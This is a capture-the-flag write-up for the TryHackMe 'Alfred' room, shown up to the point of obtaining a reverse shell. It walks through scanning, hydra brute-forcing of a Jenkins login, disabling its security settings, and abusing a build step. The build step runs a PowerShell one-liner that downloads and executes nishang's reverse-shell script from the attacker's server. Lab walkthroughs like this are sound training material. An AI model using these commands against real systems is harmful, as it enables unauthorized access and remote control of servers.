# THM - Alfred Write-Up

"In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access."

## Task 1: Initial Access

**How many ports are open? (TCP only)**

As always, we're going to start with a aggressive nmap scan on all ports with very verbose output.

```
nmap 10.10.27.251 -p- -A -vv
```

Running this scan, we've come across an issue. The box is blocking the ping probes. We can get around this by adding -Pn to the end of our nmap to skip host discovery.

Success, we can now see that there are 3 open ports. Luckily, they're all useful.

* 8080
* 3389
* 80

While we wait for the SYN Stealth Scan, let's go checkout the website on port 80.

We can gather some information from the site, **alfred@wayneenterprises.com**

**What is the username and password for the log in panel(in the format username:password)**

From the website, we can assume that a username will be alfred. We also have the domain of the emails which may be needed later. Unfortunately, I see no extra information from the source.

Now that the nmap is complete, we can see that this is a Microsoft Windows Server 2012 R2 that is running Jetty(9.4.z-SNAPSHOT) on port 8080. Let's try to visit that port in our browser.

On MACHINE_IP:8080 we can see that there is a Jenkins login form. Let's try to find a way to login to alfred. When we view the source we can see the field names are j_username:j_password and that the error message displayed with incorrect credentials is "Invalid username or password". This will be useful if we need to use hydra to attempt to bruteforce the login form. 

Let's try to login to alfred with some common passwords to test if it will lock out the account for incorrect attempts. It looks like Jenkins doesn't have an attempt limit so let's try a bruteforce with the wellknown password list [rockyou.txt](https://www.kaggle.com/wjburns/common-password-list-rockyoutxt)

We're going to use hydra to do this but first we need to get the action and method.
* Action: j_acegi_security_check
* Method: Post

```
hydra -s 8080 -l afred -P /usr/share/wordlists/rockyou.txt 10.10.27.251 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password." 
```

Unfortunately, after a few minutes I'm going to be moving on from this. Let's go look at jenkins while this is running in the background and find out what the default administrative user is named. Maybe, we can get in with default credentials.

After some research, it looks like the default administrator username for jenkins is "admin". Let's run hydra with the http_default_pass.txt in metasploit wordlists to try and get into this account.

```
hydra -s 8080 -l admin -P /usr/share/wordlists/metasploit/http_default_pass.txt 10.10.27.251 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password."
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-17 11:51:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 19 login tries (l:1/p:19), ~2 tries per task
[DATA] attacking http-post-form://10.10.27.251:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password.
[8080][http-post-form] host: 10.10.27.251   login: admin   password: admin                                                                    
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-17 11:51:37

```

Perfect, not only did we get an account... we got access to the admin account.

Since earlier we saw that 3389 was open, let's take a shot in the dark and try to RDP with the admin:admin credentials. No luck here, but was worth a try.

Let's login on port 8080 and take a look around.
* Go to people section to look for other users - none seen.
* Go to credentials - nothing seen here
* Go to manage jenkins - this shows that there is a lot of vulnerabilities with this Jenkins server.
* Scroll down in manage jenkins to Configure Global Security and disable it, turn off CSRF Protection and save.

Let's now try to search for a way to execute commands on the server so we can try and get a shell.

If we go to jobs>project>configure we can scroll down to the Build section and see that it executes a Windows batch command. It looks like the default command is a whoami.

Lets test this out to get some information. If we go to builds and view the console output, we can see the result of our script.

```
Started by user unknown or anonymous
Running as SYSTEM
Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
[project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins822259080465788895.bat

C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

So it looks like Jenkins executes the commands as system but is access to a user (alfred/bruce). Let's check and see if we can use powershell. We're in luck the cmd can launch powershell. Let's use [nishang](https://github.com/samratashok/nishang) and transfer Invoke-PowerShellTcp.ps1 to the server using Jenkins and a Simple HTTP server. We will want to launch a netcat listener before we do this, to pickup the shell.

* Move the terminals location to the directory containing Invoke-PowerShellTcp.ps1 and start the server (I made one for this room named Alfred).

```
python3 -m http.server
```

* Start netcat listener on port 4444

```
nc -lvnp 4444
```

* Update and build the following powershell that will transfer and execute the powershell script on the server.

```ps
powershell iex (New-Object Net.WebClient).DownloadString('http://Tun0-IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress Tun0-IP -Port 4444
```

